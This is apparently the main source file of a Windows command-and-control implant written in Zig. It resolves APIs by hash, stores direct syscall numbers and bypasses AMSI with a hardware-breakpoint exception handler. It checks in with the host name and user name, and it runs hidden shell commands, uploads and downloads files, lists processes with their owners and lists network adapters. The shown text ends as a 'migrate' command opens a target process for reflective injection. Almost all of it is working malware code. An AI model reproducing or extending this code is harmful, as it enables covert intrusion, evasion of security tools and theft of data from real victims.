const std = @import("std");
const api = @import("api.zig");
const crypto = @import("crypto.zig");
const build_options = @import("build_options");
const transport = @import("transport/mod.zig");
const HttpTransport = @import("transport/http.zig").HttpTransport;
const DnsTransport = @import("transport/dns.zig").DnsTransport;
const syscalls = @import("syscalls.zig");
const injection = @import("injection.zig");
const bof = @import("bof.zig");

// --- Window API Constants ---
const CREATE_NO_WINDOW: u32      = 0x08000000;
const STARTF_USESTDHANDLES: u32  = 0x00000100;
const INVALID_HANDLE_VALUE: ?*anyopaque = @ptrFromInt(std.math.maxInt(usize));

// --- Function Type Definitions ---
const SleepFn               = *const fn(u32) callconv(.winapi) void;
const GetCurrentProcessIdFn = *const fn() callconv(.winapi) u32;
const GetCurrentThreadIdFn  = *const fn() callconv(.winapi) u32;
const GetComputerNameWFn    = *const fn([*]u16, *u32) callconv(.winapi) i32;
const GetUserNameWFn        = *const fn([*]u16, *u32) callconv(.winapi) i32;
const GetModuleFileNameAFn  = *const fn(?*anyopaque, [*]u8, u32) callconv(.winapi) u32;
const CreateProcessWFn      = *const fn(?[*:0]const u16, ?[*:0]u16, ?*anyopaque, ?*anyopaque, i32, u32, ?*anyopaque, ?[*:0]const u16, *api.STARTUPINFOW, *api.PROCESS_INFORMATION) callconv(.winapi) i32;
const CreatePipeFn          = *const fn(*?*anyopaque, *?*anyopaque, ?*anyopaque, u32) callconv(.winapi) i32;
const ReadFileFn            = *const fn(?*anyopaque, *anyopaque, u32, *u32, ?*anyopaque) callconv(.winapi) i32;
const CloseHandleFn         = *const fn(?*anyopaque) callconv(.winapi) i32;
const WaitForSingleObjectFn = *const fn(?*anyopaque, u32) callconv(.winapi) u32;
const GetConsoleWindowFn    = *const fn() callconv(.winapi) ?*anyopaque;
const ShowWindowFn          = *const fn(?*anyopaque, i32) callconv(.winapi) i32;
const GetTempPathAFn        = *const fn(u32, [*]u8) callconv(.winapi) u32;

const GetCurrentDirectoryAFn = *const fn(u32, [*]u8) callconv(.winapi) u32;
const SetCurrentDirectoryAFn = *const fn(?[*:0]const u8) callconv(.winapi) i32;
const FindFirstFileAFn       = *const fn(?[*:0]const u8, *api.WIN32_FIND_DATAA) callconv(.winapi) ?*anyopaque;
const FindNextFileAFn        = *const fn(?*anyopaque, *api.WIN32_FIND_DATAA) callconv(.winapi) i32;
const FindCloseFn            = *const fn(?*anyopaque) callconv(.winapi) i32;
const CreateFileAFn          = *const fn(?[*:0]const u8, u32, u32, ?*anyopaque, u32, u32, ?*anyopaque) callconv(.winapi) ?*anyopaque;
const WriteFileFn            = *const fn(?*anyopaque, [*]const u8, u32, *u32, ?*anyopaque) callconv(.winapi) i32;
const GetFileSizeFn          = *const fn(?*anyopaque, ?*u32) callconv(.winapi) u32;
const DeleteFileAFn          = *const fn(?[*:0]const u8) callconv(.winapi) i32;
const ExitProcessFn          = *const fn(u32) callconv(.winapi) void;
const CreateToolhelp32SnapshotFn = *const fn(u32, u32) callconv(.winapi) ?*anyopaque;
const Process32FirstFn       = *const fn(?*anyopaque, *api.PROCESSENTRY32) callconv(.winapi) i32;
const Process32NextFn        = *const fn(?*anyopaque, *api.PROCESSENTRY32) callconv(.winapi) i32;
const GetAdaptersInfoFn      = *const fn(?*api.IP_ADAPTER_INFO, *u32) callconv(.winapi) u32;
const AddVectoredExceptionHandlerFn = *const fn(u32, api.PVECTORED_EXCEPTION_HANDLER) callconv(.winapi) ?*anyopaque;
const RemoveVectoredExceptionHandlerFn = *const fn(?*anyopaque) callconv(.winapi) u32;
const RaiseExceptionFn       = *const fn(u32, u32, u32, ?*const usize) callconv(.winapi) void;
const VirtualQueryFn         = *const fn(?*const anyopaque, *api.MEMORY_BASIC_INFORMATION, usize) callconv(.winapi) usize;
const VirtualProtectFn       = *const fn(?*anyopaque, usize, u32, *u32) callconv(.winapi) i32;
const CreateEventWFn         = *const fn(?*anyopaque, i32, i32, ?[*:0]const u16) callconv(.winapi) ?*anyopaque;
const SetEventFn             = *const fn(?*anyopaque) callconv(.winapi) i32;
const CreateTimerQueueFn     = *const fn() callconv(.winapi) ?*anyopaque;
const CreateTimerQueueTimerFn = *const fn(*?*anyopaque, ?*anyopaque, *const anyopaque, ?*anyopaque, u32, u32, u32) callconv(.winapi) i32;
const DeleteTimerQueueFn     = *const fn(?*anyopaque, ?*anyopaque) callconv(.winapi) i32;
const RtlCaptureContextFn    = *const fn(*api.CONTEXT) callconv(.winapi) void;
const NtContinueFn           = *const fn(*api.CONTEXT, u8) callconv(.winapi) u32;
const SystemFunction032Fn    = *const fn(*anyopaque, *const anyopaque) callconv(.winapi) i32;
const SetFilePointerFn       = *const fn(?*anyopaque, i32, ?*i32, u32) callconv(.winapi) u32;
const GetLocalTimeFn         = *const fn(*api.SYSTEMTIME) callconv(.winapi) void;

const SW_HIDE = 0;
const WT_EXECUTEINTIMERTHREAD: u32 = 0; 
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
const EXCEPTION_SINGLE_STEP: u32 = 0x80000004;
const GHOST_EXCEPTION: u32 = 0xDEADBEEF;

// --- Globals for resolved APIs ---
var Sleep:               SleepFn               = undefined;
var GetCurrentProcessId: GetCurrentProcessIdFn = undefined;
var GetCurrentThreadId:  GetCurrentThreadIdFn  = undefined;
var GetComputerNameW:    GetComputerNameWFn    = undefined;
var GetUserNameW:        GetUserNameWFn        = undefined;
var GetModuleFileNameA:  GetModuleFileNameAFn  = undefined;
var CreateProcessW:      CreateProcessWFn      = undefined;
var CreatePipe:          CreatePipeFn          = undefined;
var ReadFile:            ReadFileFn            = undefined;
var CloseHandle:         CloseHandleFn         = undefined;
var WaitForSingleObject: WaitForSingleObjectFn = undefined;
var GetTempPathA:        GetTempPathAFn        = undefined;

var GetCurrentDirectoryA: GetCurrentDirectoryAFn = undefined;
var SetCurrentDirectoryA: SetCurrentDirectoryAFn = undefined;
var FindFirstFileA:       FindFirstFileAFn       = undefined;
var FindNextFileA:        FindNextFileAFn        = undefined;
var FindClose:            FindCloseFn            = undefined;
var CreateFileA:          CreateFileAFn          = undefined;
var WriteFile:            WriteFileFn            = undefined;
var GetFileSize:          GetFileSizeFn          = undefined;
var DeleteFileA:          DeleteFileAFn          = undefined;
var ExitProcess:          ExitProcessFn          = undefined;
var CreateToolhelp32Snapshot: CreateToolhelp32SnapshotFn = undefined;
var Process32First:       Process32FirstFn       = undefined;
var Process32Next:        Process32NextFn        = undefined;
var IsWow64Process:       api.IsWow64ProcessFn   = undefined;
var GetAdaptersInfo:      GetAdaptersInfoFn      = undefined;
var OpenSCManagerA:       api.OpenSCManagerAFn   = undefined;
var OpenServiceA:         api.OpenServiceAFn     = undefined;
var EnumServicesStatusExA: api.EnumServicesStatusExAFn = undefined;
var QueryServiceConfigA:  api.QueryServiceConfigAFn = undefined;
var CloseServiceHandle:   api.CloseServiceHandleFn = undefined;
var AddVectoredExceptionHandler: AddVectoredExceptionHandlerFn = undefined;
var RemoveVectoredExceptionHandler: RemoveVectoredExceptionHandlerFn = undefined;
var RaiseException:       RaiseExceptionFn       = undefined;
var VirtualQuery:         VirtualQueryFn         = undefined;
var VirtualProtect:       VirtualProtectFn       = undefined;
var CreateEventW:         CreateEventWFn         = undefined;
var SetEvent:             SetEventFn             = undefined;
var CreateTimerQueue:     CreateTimerQueueFn     = undefined;
var CreateTimerQueueTimer: CreateTimerQueueTimerFn = undefined;
var DeleteTimerQueue:     DeleteTimerQueueFn     = undefined;
var RtlCaptureContext:    RtlCaptureContextFn    = undefined;
var NtContinue:           NtContinueFn           = undefined;
var SystemFunction032:    SystemFunction032Fn    = undefined;
var RtlExitUserThread:    api.RtlExitUserThreadFn = undefined;
var SetFilePointer:       SetFilePointerFn       = undefined;
var GetLocalTime:         GetLocalTimeFn         = undefined;

var sleep_event: ?*anyopaque = null;

var nt_protect_ssn: u32 = 0;
var nt_allocate_ssn: u32 = 0;
var nt_write_ssn: u32 = 0;
var nt_create_user_process_ssn: u32 = 0;
var nt_queue_apc_ssn: u32 = 0;
var nt_resume_thread_ssn: u32 = 0;
var nt_create_section_ssn: u32 = 0;
var nt_map_view_of_section_ssn: u32 = 0;
var nt_duplicate_object_ssn: u32 = 0;
var nt_create_thread_ex_ssn: u32 = 0;
var nt_query_system_information_ssn: u32 = 0;
var nt_query_object_ssn: u32 = 0;
var nt_query_information_worker_factory_ssn: u32 = 0;
var nt_set_information_worker_factory_ssn: u32 = 0;
var nt_query_information_process_ssn: u32 = 0;
var nt_read_virtual_memory_ssn: u32 = 0;

// --- RC4 session key ---
var session_key: [16]u8 = undefined;
var agent_id_buf: [16]u8 = undefined;

// --- C2 JSON Structs ---
const Task = struct {
    id: []const u8,
    command: ?[]const u8 = null,
    arguments: ?[]const u8 = null,
};

const CheckinResponse = struct {
    status: []const u8,
    tasks: []Task,
};

// --- Agent Identity & Transport ---
var current_transport: transport.Transport = undefined;
var current_sleep: u32 = 5;
var current_jitter: u32 = 20;

var amsi_target: usize = 0;

fn jsonEscape(arena: std.mem.Allocator, input: []const u8) []const u8 {
    var list: std.ArrayListUnmanaged(u8) = .empty;
    for (input) |c| {
        switch (c) {
            '\\' => list.appendSlice(arena, "\\\\") catch {},
            '\"' => list.appendSlice(arena, "\\\"") catch {},
            '\n' => list.appendSlice(arena, "\\n") catch {},
            '\r' => list.appendSlice(arena, "\\r") catch {},
            '\t' => list.appendSlice(arena, "\\t") catch {},
            else => {
                if (c < 32) {
                    list.appendSlice(arena, "\\u00") catch {};
                    const hex = "0123456789abcdef";
                    list.append(arena, hex[c >> 4]) catch {};
                    list.append(arena, hex[c & 0x0F]) catch {};
                } else {
                    list.append(arena, c) catch {};
                }
            },
        }
    }
    return list.toOwnedSlice(arena) catch input;
}

fn veh(pointers: *api.EXCEPTION_POINTERS) callconv(.winapi) i32 {
    const record = pointers.ExceptionRecord;
    const context = pointers.ContextRecord;

    if (record.ExceptionCode == GHOST_EXCEPTION) {
        context.Dr0 = amsi_target;
        context.Dr7 = 1; // Local enable DR0
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if (record.ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (context.Rip == amsi_target) {
            context.Rax = 0; // AMSI_RESULT_CLEAN
            const caller = @as(*u64, @ptrFromInt(context.Rsp)).*;
            context.Rip = caller;
            context.Rsp += 8;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

// --- Gather real system info for checkin ---
fn buildCheckinPayload(arena: std.mem.Allocator) []u8 {
    var hostname_w: [256]u16 = undefined;
    var hostname_len: u32 = hostname_w.len;
    var username_w: [256]u16 = undefined;
    var username_len: u32 = username_w.len;

    var hostname: []const u8 = "unknown";
    var username: []const u8 = "unknown";

    if (GetComputerNameW(&hostname_w, &hostname_len) != 0) {
        hostname = std.unicode.utf16LeToUtf8Alloc(arena, hostname_w[0..hostname_len]) catch "unknown";
    }
    if (GetUserNameW(&username_w, &username_len) != 0) {
        const ulen = if (username_len > 0) username_len - 1 else 0;
        username = std.unicode.utf16LeToUtf8Alloc(arena, username_w[0..ulen]) catch "unknown";
    }

    const pid = GetCurrentProcessId();
    const tid = GetCurrentThreadId();
    agent_id_buf = crypto.generateAgentId(pid, tid, hostname);
    const agent_id = agent_id_buf[0..16];
    const arch: []const u8 = if (@sizeOf(usize) == 8) "x64" else "x86";
    const sleep = current_sleep;
    const jitter = current_jitter;
    
    return std.fmt.allocPrint(arena,
        "{{\"agent_id\":\"{s}\",\"hostname\":\"{s}\",\"username\":\"{s}\",\"ip_address\":\"127.0.0.1\",\"pid\":{d},\"arch\":\"{s}\",\"sleep\":{d},\"jitter\":{d}}}",
        .{ agent_id, hostname, username, pid, arch, sleep, jitter },
    ) catch "";
}

// --- Trace logging with Timestamp and ID ---
fn logToFile(arena: std.mem.Allocator, message: []const u8) void {
    var temp_path: [api.MAX_PATH]u8 = [_]u8{0} ** api.MAX_PATH;
    const path_len = GetTempPathA(api.MAX_PATH, &temp_path);
    if (path_len == 0) return;

    const log_name = "lockjaw_agent.log";
    const log_path = std.fmt.allocPrint(arena, "{s}{s}", .{temp_path[0..path_len], log_name}) catch return;
    const log_path_z = arena.dupeZ(u8, log_path) catch return;
    
    const hFile = CreateFileA(log_path_z, api.GENERIC_WRITE, api.FILE_SHARE_READ | api.FILE_SHARE_WRITE, null, api.OPEN_ALWAYS, api.FILE_ATTRIBUTE_NORMAL, null);
    if (hFile == api.INVALID_HANDLE_VALUE) return;
    defer _ = CloseHandle(hFile);

    _ = SetFilePointer(hFile, 0, null, api.FILE_END);

    var time = std.mem.zeroes(api.SYSTEMTIME);
    GetLocalTime(&time);

    const timestamped_msg = std.fmt.allocPrint(arena, "[{d:0>4}-{d:0>2}-{d:0>2} {d:0>2}:{d:0>2}:{d:0>2}.{d:0>3}] Agent:{s} | {s}\n", .{
        time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute, time.wSecond, time.wMilliseconds,
        agent_id_buf[0..8], message
    }) catch message;
    
    var written: u32 = 0;
    _ = WriteFile(hFile, timestamped_msg.ptr, @as(u32, @intCast(timestamped_msg.len)), &written, null);
}

fn jitteredSleepMs(base_ms: u32, jitter_pct: u32, seed: *u64) u32 {
    seed.* = seed.* *% 6364136223846793005 +% 1442695040888963407;
    const rnd = @as(u32, @intCast(seed.* >> 33));
    if (jitter_pct == 0) return base_ms;
    const max_delta: u32 = base_ms / 100 * jitter_pct;
    const delta: u32 = rnd % (max_delta * 2);
    if (delta < max_delta) return base_ms - (max_delta - delta);
    return base_ms + (delta - max_delta);
}

// --- Shell execution ---
fn runShell(arena: std.mem.Allocator, args: []const u8) []const u8 {
    var cmd_buf: [1024]u8 = undefined;
    const cmd_str = std.fmt.bufPrint(&cmd_buf, "cmd.exe /c {s}", .{args}) catch return "Error building command";
    var cmd_w: [1024]u16 = undefined;
    const cmd_w_len = std.unicode.utf8ToUtf16Le(&cmd_w, cmd_str) catch return "Error converting command";
    cmd_w[cmd_w_len] = 0;

    var sa = std.mem.zeroes(struct { nLength: u32, lpSecurityDescriptor: ?*anyopaque, bInheritHandle: i32 });
    sa.nLength = @sizeOf(@TypeOf(sa));
    sa.bInheritHandle = 1;

    var pipe_read:  ?*anyopaque = null;
    var pipe_write: ?*anyopaque = null;
    if (CreatePipe(&pipe_read, &pipe_write, @ptrCast(&sa), 0) == 0) return "CreatePipe failed";
    defer _ = CloseHandle(pipe_read);
    defer _ = CloseHandle(pipe_write);

    var si = std.mem.zeroes(api.STARTUPINFOW);
    si.cb = @sizeOf(api.STARTUPINFOW);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = pipe_write;
    si.hStdError = pipe_write;

    var pi = std.mem.zeroes(api.PROCESS_INFORMATION);
    if (CreateProcessW(null, @ptrCast(&cmd_w), null, null, 1, CREATE_NO_WINDOW, null, null, &si, &pi) == 0) return "CreateProcessW failed";
    _ = CloseHandle(pipe_write);

    var out_buf: std.ArrayListUnmanaged(u8) = .empty;
    var buf: [4096]u8 = undefined;
    var n: u32 = 0;
    while (ReadFile(pipe_read, &buf, buf.len, &n, null) != 0) {
        if (n == 0) break;
        out_buf.appendSlice(arena, buf[0..n]) catch break;
    }
    return out_buf.toOwnedSlice(arena) catch "OOM";
}

fn runShellDetached(args: []const u8) void {
    var cmd_buf: [1024]u8 = undefined;
    const cmd_str = std.fmt.bufPrint(&cmd_buf, "cmd.exe /c {s}", .{args}) catch return;
    var cmd_w: [1024]u16 = undefined;
    const cmd_w_len = std.unicode.utf8ToUtf16Le(&cmd_w, cmd_str) catch return;
    cmd_w[cmd_w_len] = 0;

    var si = std.mem.zeroes(api.STARTUPINFOW);
    si.cb = @sizeOf(api.STARTUPINFOW);
    var pi = std.mem.zeroes(api.PROCESS_INFORMATION);
    _ = CreateProcessW(null, @ptrCast(&cmd_w), null, null, 0, CREATE_NO_WINDOW, null, null, &si, &pi);
}

fn dispatchTask(task: Task, arena: std.mem.Allocator) void {
    const cmd = task.command orelse return;
    const args = task.arguments orelse "";
    
    logToFile(arena, std.fmt.allocPrint(arena, "Flow: dispatchTask entered for '{s}'", .{cmd}) catch "Flow: dispatchTask entered");

    if (std.mem.eql(u8, cmd, "shell")) {
        logToFile(arena, "Flow: Executing shell command...");
        const output = runShell(arena, args);
        logToFile(arena, "Flow: Shell command executed, sending result...");
        sendResult(task.id, output, arena);
    } else if (std.mem.eql(u8, cmd, "sleep")) {
        logToFile(arena, "Flow: Executing sleep command...");
        var it = std.mem.tokenizeAny(u8, args, " ");
        if (it.next()) |s_val| {
            current_sleep = std.fmt.parseInt(u32, s_val, 10) catch current_sleep;
        }
        if (it.next()) |j_val| {
            current_jitter = std.fmt.parseInt(u32, j_val, 10) catch current_jitter;
        }
        const msg = std.fmt.allocPrint(arena, "Sleep set to {d}s, jitter {d}%", .{current_sleep, current_jitter}) catch "OK";
        sendResult(task.id, msg, arena);
    } else if (std.mem.eql(u8, cmd, "pwd")) {
        var buf: [api.MAX_PATH]u8 = undefined;
        const len = GetCurrentDirectoryA(api.MAX_PATH, &buf);
        if (len > 0) {
            sendResult(task.id, buf[0..len], arena);
        } else {
            sendResult(task.id, "Error getting CWD", arena);
        }
    } else if (std.mem.eql(u8, cmd, "cd")) {
        const path_z = arena.dupeZ(u8, args) catch return;
        if (SetCurrentDirectoryA(path_z) != 0) {
            sendResult(task.id, "Changed directory", arena);
        } else {
            sendResult(task.id, "Failed to change directory", arena);
        }
    } else if (std.mem.eql(u8, cmd, "die")) {
        sendResult(task.id, "Exiting...", arena);
        ExitProcess(0);
    } else if (std.mem.eql(u8, cmd, "whoami")) {
        const checkin = buildCheckinPayload(arena);
        sendResult(task.id, checkin, arena);
    } else if (std.mem.eql(u8, cmd, "ls")) {
        const search_path = if (args.len > 0) blk: {
            const path = std.fmt.allocPrint(arena, "{s}\\*", .{args}) catch return;
            break :blk arena.dupeZ(u8, path) catch return;
        } else 
            ".\\*";
        
        var find_data: api.WIN32_FIND_DATAA = undefined;
        const hFind = FindFirstFileA(search_path, &find_data);
        if (hFind == api.INVALID_HANDLE_VALUE) {
            sendResult(task.id, "Directory not found or access denied", arena);
            return;
        }
        defer _ = FindClose(hFind);

        var output = std.ArrayListUnmanaged(u8).empty;
        output.appendSlice(arena, "Type\tSize\tName\n") catch return;
        output.appendSlice(arena, "----\t----\t----\n") catch return;

        while (true) {
            const is_dir = (find_data.dwFileAttributes & 0x10) != 0;
            const name_len = std.mem.indexOf(u8, &find_data.cFileName, "\x00") orelse find_data.cFileName.len;
            const name = find_data.cFileName[0..name_len];

            const line = std.fmt.allocPrint(arena, "{s}\t{d}\t{s}\n", .{
                if (is_dir) "DIR" else "FILE",
                find_data.nFileSizeLow,
                name,
            }) catch break;
            output.appendSlice(arena, line) catch break;

            if (FindNextFileA(hFind, &find_data) == 0) break;
        }
        sendResult(task.id, output.items, arena);
    } else if (std.mem.eql(u8, cmd, "rm")) {
        const path_z = arena.dupeZ(u8, args) catch return;
        if (DeleteFileA(path_z) != 0) {
            sendResult(task.id, "File deleted", arena);
        } else {
            sendResult(task.id, "Failed to delete file", arena);
        }
    } else if (std.mem.eql(u8, cmd, "cat")) {
        const path_z = arena.dupeZ(u8, args) catch return;
        const hFile = CreateFileA(path_z, api.GENERIC_READ, api.FILE_SHARE_READ, null, api.OPEN_EXISTING, api.FILE_ATTRIBUTE_NORMAL, null);
        if (hFile == api.INVALID_HANDLE_VALUE) {
            sendResult(task.id, "Could not open file", arena);
            return;
        }
        defer _ = CloseHandle(hFile);

        const size = GetFileSize(hFile, null);
        if (size == 0xFFFFFFFF) {
            sendResult(task.id, "Could not get file size", arena);
            return;
        }

        const buf = arena.alloc(u8, size) catch return;
        var read: u32 = 0;
        if (ReadFile(hFile, buf.ptr, size, &read, null) != 0) {
            sendResult(task.id, buf[0..read], arena);
        } else {
            sendResult(task.id, "Read failed", arena);
        }
    } else if (std.mem.eql(u8, cmd, "ps")) {
        logToFile(arena, "Flow: Executing improved ps command...");
        const hSnap = CreateToolhelp32Snapshot(api.TH32CS_SNAPPROCESS, 0);
        if (hSnap == api.INVALID_HANDLE_VALUE) {
            sendResult(task.id, "Failed to create snapshot", arena);
            return;
        }
        defer _ = CloseHandle(hSnap);

        var entry_ps: api.PROCESSENTRY32 = undefined;
        entry_ps.dwSize = @sizeOf(api.PROCESSENTRY32);

        if (Process32First(hSnap, &entry_ps) == 0) {
            sendResult(task.id, "Process32First failed", arena);
            return;
        }

        const kbase_hash = comptime crypto.djb2_i("KERNELBASE.DLL");
        const kbase = api.getModuleHandleByHash(kbase_hash).?;
        const GetProcessMitigationPolicy = @as(api.GetProcessMitigationPolicyFn, @ptrCast(api.getProcAddressByHash(kbase, comptime crypto.djb2("GetProcessMitigationPolicy")).?));
        const k32_hash = comptime crypto.djb2_i("KERNEL32.DLL");
        const k32 = api.getModuleHandleByHash(k32_hash).?;
        const OpenProcess = @as(api.OpenProcessFn, @ptrCast(api.getProcAddressByHash(k32, comptime crypto.djb2("OpenProcess")).?));
        const advapi_hash = comptime crypto.djb2_i("ADVAPI32.DLL");
        const advapi = api.getModuleHandleByHash(advapi_hash).?;
        const OpenProcessToken = @as(api.OpenProcessTokenFn, @ptrCast(api.getProcAddressByHash(advapi, comptime crypto.djb2("OpenProcessToken")).?));
        const GetTokenInformation = @as(api.GetTokenInformationFn, @ptrCast(api.getProcAddressByHash(advapi, comptime crypto.djb2("GetTokenInformation")).?));
        const LookupAccountSidA = @as(api.LookupAccountSidAFn, @ptrCast(api.getProcAddressByHash(advapi, comptime crypto.djb2("LookupAccountSidA")).?));

        var output = std.ArrayListUnmanaged(u8).empty;
        output.appendSlice(arena, "PID | Arch | ACG | CFG | User | Name\n") catch return;
        output.appendSlice(arena, "--- | ---- | --- | --- | ---- | ----\n") catch return;

        while (true) {
            const name_len = std.mem.indexOf(u8, &entry_ps.szExeFile, "\x00") orelse entry_ps.szExeFile.len;
            const name = entry_ps.szExeFile[0..name_len];

            var arch: []const u8 = "x64";
            var acg_status: []const u8 = "?";
            var cfg_status: []const u8 = "?";
            var user_name: []const u8 = "unknown";

            if (OpenProcess(api.PROCESS_QUERY_INFORMATION, 0, entry_ps.th32ProcessID)) |hProc| {
                defer _ = CloseHandle(hProc);

                var isWow64: i32 = 0;
                if (IsWow64Process(hProc, &isWow64) != 0) {
                    if (isWow64 != 0) {
                        arch = "x86";
                    }
                }

                var acg_p = std.mem.zeroes(api.PROCESS_MITIGATION_DYNAMIC_CODE_POLICY);
                if (GetProcessMitigationPolicy(hProc, .ProcessDynamicCodePolicy, &acg_p, @sizeOf(api.PROCESS_MITIGATION_DYNAMIC_CODE_POLICY)) != 0) {
                    acg_status = if ((acg_p.Flags & 0x01) != 0) "ON" else "off";
                }

                var cfg_p = std.mem.zeroes(api.PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY);
                if (GetProcessMitigationPolicy(hProc, .ProcessControlFlowGuardPolicy, &cfg_p, @sizeOf(api.PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY)) != 0) {
                    cfg_status = if ((cfg_p.Flags & 0x01) != 0) "ON" else "off";
                }

                var hToken: ?*anyopaque = null;
                if (OpenProcessToken(hProc, api.TOKEN_QUERY, &hToken) != 0) {
                    defer _ = CloseHandle(hToken);
                    var len: u32 = 0;
                    _ = GetTokenInformation(hToken.?, .TokenUser, null, 0, &len);
                    if (len > 0) {
                        const token_user_buf = arena.alloc(u8, len) catch break;
                        if (GetTokenInformation(hToken.?, .TokenUser, token_user_buf.ptr, len, &len) != 0) {
                            const tu = @as(*api.TOKEN_USER, @ptrCast(@alignCast(token_user_buf.ptr)));
                            var name_buf: [256]u8 = undefined;
                            var name_sz: u32 = 256;
                            var dom_buf: [256]u8 = undefined;
                            var dom_sz: u32 = 256;
                            var use: u32 = 0;
                            if (LookupAccountSidA(null, tu.User.Sid, &name_buf, &name_sz, &dom_buf, &dom_sz, &use) != 0) {
                                user_name = arena.dupe(u8, name_buf[0..name_sz]) catch "unknown";
                            }
                        }
                    }
                }
            }

            const line = std.fmt.allocPrint(arena, "{d} | {s} | {s} | {s} | {s} | {s}\n", .{
                entry_ps.th32ProcessID,
                arch,
                acg_status,
                cfg_status,
                user_name,
                name,
            }) catch break;
            output.appendSlice(arena, line) catch break;

            if (Process32Next(hSnap, &entry_ps) == 0) break;
        }
        logToFile(arena, "Flow: ps command finished, sending result...");
        sendResult(task.id, output.items, arena);
    } else if (std.mem.eql(u8, cmd, "upload")) {
        var it = std.mem.tokenizeAny(u8, args, " ");
        const path = it.next() orelse {
            sendResult(task.id, "Usage: upload <path> <b64_data>", arena);
            return;
        };
        const b64_data = it.next() orelse {
            sendResult(task.id, "Usage: upload <path> <b64_data>", arena);
            return;
        };

        const decoded_size = std.base64.standard.Decoder.calcSizeForSlice(b64_data) catch {
            sendResult(task.id, "Invalid base64 length", arena);
            return;
        };
        const buf = arena.alloc(u8, decoded_size) catch return;
        std.base64.standard.Decoder.decode(buf, b64_data) catch {
            sendResult(task.id, "Base64 decode failed", arena);
            return;
        };

        const path_z = arena.dupeZ(u8, path) catch return;
        const hFile = CreateFileA(path_z, api.GENERIC_WRITE, 0, null, api.CREATE_ALWAYS, api.FILE_ATTRIBUTE_NORMAL, null);
        if (hFile == api.INVALID_HANDLE_VALUE) {
            sendResult(task.id, "Could not create file", arena);
            return;
        }
        defer _ = CloseHandle(hFile);

        var written: u32 = 0;
        if (WriteFile(hFile, buf.ptr, @as(u32, @intCast(buf.len)), &written, null) != 0) {
            sendResult(task.id, "Upload successful", arena);
        } else {
            sendResult(task.id, "Write failed", arena);
        }
    } else if (std.mem.eql(u8, cmd, "download")) {
        const path_z = arena.dupeZ(u8, args) catch return;
        const hFile = CreateFileA(path_z, api.GENERIC_READ, api.FILE_SHARE_READ, null, api.OPEN_EXISTING, api.FILE_ATTRIBUTE_NORMAL, null);
        if (hFile == api.INVALID_HANDLE_VALUE) {
            sendResult(task.id, "Could not open file", arena);
            return;
        }
        defer _ = CloseHandle(hFile);

        const size = GetFileSize(hFile, null);
        if (size == 0xFFFFFFFF) {
            sendResult(task.id, "Could not get file size", arena);
            return;
        }

        const buf = arena.alloc(u8, size) catch return;
        var read: u32 = 0;
        if (ReadFile(hFile, buf.ptr, size, &read, null) != 0) {
            const enc_size = std.base64.standard.Encoder.calcSize(read);
            const enc_buf = arena.alloc(u8, enc_size) catch return;
            const encoded = std.base64.standard.Encoder.encode(enc_buf, buf[0..read]);
            sendResult(task.id, encoded, arena);
        } else {
            sendResult(task.id, "Read failed", arena);
        }
    } else if (std.mem.eql(u8, cmd, "ipconfig")) {
        var size: u32 = 0;
        _ = GetAdaptersInfo(null, &size);
        
        if (size == 0) {
            sendResult(task.id, "No adapters found", arena);
            return;
        }

        const buf = arena.alloc(u8, size) catch return;
        const adapter_info: *api.IP_ADAPTER_INFO = @ptrCast(@alignCast(buf.ptr));

        if (GetAdaptersInfo(adapter_info, &size) == 0) {
            var output = std.ArrayListUnmanaged(u8).empty;
            var current: ?*api.IP_ADAPTER_INFO = adapter_info;

            while (current) |adapter| {
                const desc_len = std.mem.indexOf(u8, &adapter.Description, "\x00") orelse adapter.Description.len;
                const name_len = std.mem.indexOf(u8, &adapter.AdapterName, "\x00") orelse adapter.AdapterName.len;
                const ip_len = std.mem.indexOf(u8, &adapter.IpAddressList.IpAddress.String, "\x00") orelse adapter.IpAddressList.IpAddress.String.len;
                const mask_len = std.mem.indexOf(u8, &adapter.IpAddressList.IpMask.String, "\x00") orelse adapter.IpAddressList.IpMask.String.len;
                const gw_len = std.mem.indexOf(u8, &adapter.GatewayList.IpAddress.String, "\x00") orelse adapter.GatewayList.IpAddress.String.len;

                const line = std.fmt.allocPrint(arena, 
                    "Adapter: {s}\n  Description: {s}\n  IP Address: {s}\n  Subnet Mask: {s}\n  Gateway: {s}\n\n",
                    .{
                        adapter.AdapterName[0..name_len],
                        adapter.Description[0..desc_len],
                        adapter.IpAddressList.IpAddress.String[0..ip_len],
                        adapter.IpAddressList.IpMask.String[0..mask_len],
                        adapter.GatewayList.IpAddress.String[0..gw_len],
                    }
                ) catch break;
                output.appendSlice(arena, line) catch break;

                current = adapter.Next;
            }
            sendResult(task.id, output.items, arena);
        } else {
            sendResult(task.id, "GetAdaptersInfo failed", arena);
        }
    } else if (std.mem.eql(u8, cmd, "migrate")) {
        var it_mig = std.mem.tokenizeAny(u8, args, " ");

        const pid_str = it_mig.next() orelse {
            sendResult(task.id, "Usage: migrate <pid> [reflective | reflective_poolstomp]", arena);
            return;
        };
        const target_pid = std.fmt.parseInt(u32, pid_str, 10) catch {
            sendResult(task.id, "Error: Invalid PID", arena);
            return;
        };

        var technique: []const u8 = "reflective"; // Default
        const next_arg = it_mig.next();
        if (next_arg) |arg| {
            if (std.mem.eql(u8, arg, "reflective_poolstomp")) {
                technique = "reflective_poolstomp";
            }
        }

        logToFile(arena, std.fmt.allocPrint(arena, "Smart-Migrate: Target PID {d}, Technique: {s}", .{target_pid, technique}) catch "");

        // Resolve necessary handles
        const k32_base = api.getModuleHandleByHash(comptime crypto.djb2_i("KERNEL32.DLL")) orelse return;
        const OpenProcess = @as(api.OpenProcessFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("OpenProcess")) orelse return));
        const CloseHandle_ = @as(api.CloseHandleFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("CloseHandle")).?));

        const hProcess = OpenProcess(api.PROCESS_ALL_ACCESS, 0, target_pid);
        if (hProcess == null) {
            sendResult(task.id, "Error: Failed to open target process", arena);
            return;
        }
        defer _ = CloseHandle_(hProcess);

        var remote_exec_addr: usize = 0;
